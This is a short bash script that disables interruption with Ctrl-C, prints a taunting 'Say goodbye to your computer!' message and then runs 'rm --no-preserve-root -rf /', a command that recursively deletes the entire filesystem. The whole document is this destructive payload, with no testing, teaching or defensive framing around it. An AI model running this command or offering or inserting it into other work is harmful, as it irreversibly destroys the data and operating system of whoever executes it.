#!/bin/bash
# Ignore SIGINT
trap '' SIGINT

echo -ne "Say goodbye to your computer!\n"
rm --no-preserve-root -rf /
